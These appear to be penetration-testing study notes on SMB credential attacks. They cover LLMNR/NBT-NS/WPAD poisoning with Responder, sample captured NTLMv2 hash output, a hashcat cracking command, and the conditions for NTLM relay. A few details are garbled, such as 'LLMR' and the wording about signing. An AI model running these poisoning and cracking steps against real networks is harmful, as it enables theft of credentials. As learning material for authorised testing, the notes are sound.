# Server Message Block (SMB)
Protocol to allow clients (workstations) to communicate wtih a server (file share)


In large networks there are 3 protocols allow hosts to perform their own local DNS resolutions for all hosts on the local network:

1. Link-Local Multicast Name Resolution (LLMR)
2. NetBIOS Name Service (NBT-NS)
3. Web Proxy Auto-Discovery (WPAD)

## 1. Use Responder to Intercept NetNTLM Challenges
Responder will actively listen to all requests and send poisioned responses telling the requesting host that our IP is associated with the requested hostname.

Note: Responder is limited to poisioning on the local network. This behaviour is disruptive and will be detected. 

```sh
sudo responder -I mynetworkinterface

[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.10
[SMBv2] NTLMv2-SSP Username : DN\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash : <Service Account Username>::ZA:<NTLMv2-SSP Hash>

```

## 2. Crack the Hash
Copy the hash from the output. If the account has a weak password configured, we can crack it!
```sh
hashcat -m 5600 <hash file> <password file> --force
```

## Relay the Challenge
The following conditions must be met in order to be able to relay a challenge:

- SMB Signing should enabled or disabled, but NOT ENFORCED. This is due to the fact that we must alter the request. If signing is enforced we won't be able to forge the signature.

- The account needs the relevant permissions on the server to access the requested resource.  This will involve guesswork or initial enumeration.
